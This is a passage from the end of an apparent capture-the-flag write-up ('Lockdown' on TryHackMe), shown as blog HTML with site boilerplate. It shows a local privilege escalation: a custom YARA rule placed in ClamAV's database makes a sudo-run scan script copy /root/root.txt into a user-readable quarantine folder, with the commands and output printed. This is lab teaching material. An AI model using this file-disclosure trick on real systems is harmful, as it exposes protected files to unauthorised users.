+</span></span><span class="line"><span class="cl">Infected files: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Data scanned: 0.00 MB
+</span></span><span class="line"><span class="cl">Data read: 0.00 MB <span class="o">(</span>ratio 0.00:1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Time: 0.011 sec <span class="o">(</span><span class="m">0</span> m <span class="m">0</span> s<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Start Date: 2021:11:29 11:47:30
+</span></span><span class="line"><span class="cl">End Date:   2021:11:29 11:47:30
+</span></span></code></pre></div><p>Since the file contained certain signatures which were declared as malicious in the clamscan database ,it identified the file as a virus and then sent it to ~/quarentine directory.</p>
+<p>The database file which identifies virus is located at <code>/var/lib/clamav/main.hdb</code> which contained - <code>69630e4574ec6798239b091cda43dca0:69:EICAR_MD5</code> &amp; so it flagged the testvirus file as malicious one.</p>
+<p>After hours of googling , I found out a way to create <code>Yara signature rule</code> of our own to flag a malicious file .</p>
+<blockquote>
+<p>ClamAV can process YARA rules. ClamAV virus database file names ending with .yar or .yara are parsed as YARA rule files</p>
+<p>How to create rule -</p>
+<ul>
+<li><a href="https://docs.clamav.net/manual/Signatures/YaraRules.html">https://docs.clamav.net/manual/Signatures/YaraRules.html</a></li>
+<li><a href="https://yara.readthedocs.io/en/stable/writingrules.html">https://yara.readthedocs.io/en/stable/writingrules.html</a></li>
+</ul>
+</blockquote>
+<p>So I created a custom signature rule called <code>rule.yara</code> with the below code &amp; saved it in <code>/var/lib/clamav</code> .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rule root
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl"> strings:
+</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">=</span> <span class="s2">&#34;THM{&#34;</span> 
+</span></span><span class="line"><span class="cl"> condition:
+</span></span><span class="line"><span class="cl">  <span class="nv">$s</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>This will flag a file which contains string like <strong>THM{</strong>  and flags it as a virus ,as a result the file gets stored in <code>~/quarentine</code> directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cyrus@lockdown:/var/lib/clamav$ sudo /opt/scan/scan.sh
+</span></span><span class="line"><span class="cl">Enter path: /root/root.txt
+</span></span><span class="line"><span class="cl">/root/root.txt: YARA.root.UNOFFICIAL FOUND
+</span></span><span class="line"><span class="cl">/root/root.txt: copied to <span class="s1">&#39;/home/cyrus/quarantine/root.txt&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">----------- SCAN SUMMARY -----------
+</span></span><span class="line"><span class="cl">Known viruses: <span class="m">2</span>
+</span></span><span class="line"><span class="cl">Engine version: 0.103.2
+</span></span><span class="line"><span class="cl">Scanned directories: <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Scanned files: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Infected files: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Data scanned: 0.00 MB
+</span></span><span class="line"><span class="cl">Data read: 0.00 MB <span class="o">(</span>ratio 0.00:1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Time: 0.006 sec <span class="o">(</span><span class="m">0</span> m <span class="m">0</span> s<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Start Date: 2021:11:29 12:21:13
+</span></span><span class="line"><span class="cl">End Date:   2021:11:29 12:21:13
+</span></span></code></pre></div><p>Success , Grab the <code>root.txt</code> flag !</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cyrus@lockdown:/var/lib/clamav$ cat ~/quarantine/root.txt 
+</span></span><span class="line"><span class="cl">THM<span class="o">{</span>IQ23Em4V**********W9GZZJxm<span class="o">}</span>
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/sql-injection/">sql-injection</a></li>
+      <li><a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/file-upload/">file-upload</a></li>
+      <li><a href="https://sh3bu.github.io/themes/hugo-PaperMod/tags/yara/">yara</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://sh3bu.github.io/themes/hugo-PaperMod/posts/convertmyvideo/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>ConvertMyVideo - THM</span>
+  </a>
+  <a class="next" href="https://sh3bu.github.io/themes/hugo-PaperMod/posts/githappens/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Git Happens - THM</span>
+  </a>
+</nav>
+
+
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Lockdown - THM on twitter"
+        href="https://twitter.com/intent/tweet/?text=Lockdown%20-%20THM&amp;url=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2flockdown%2f&amp;hashtags=sql-injection%2cfile-upload%2cyara">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Lockdown - THM on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2flockdown%2f&amp;title=Lockdown%20-%20THM&amp;summary=Lockdown%20-%20THM&amp;source=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2flockdown%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Lockdown - THM on reddit"
+        href="https://reddit.com/submit?url=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2flockdown%2f&title=Lockdown%20-%20THM">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Lockdown - THM on facebook"
+        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2flockdown%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Lockdown - THM on whatsapp"
+        href="https://api.whatsapp.com/send?text=Lockdown%20-%20THM%20-%20https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2flockdown%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Lockdown - THM on telegram"
+        href="https://telegram.me/share/url?text=Lockdown%20-%20THM&amp;url=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2flockdown%2f">
+        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+        </svg>
+    </a>
+</div>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://sh3bu.github.io/themes/hugo-PaperMod">Shebu 🔽</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
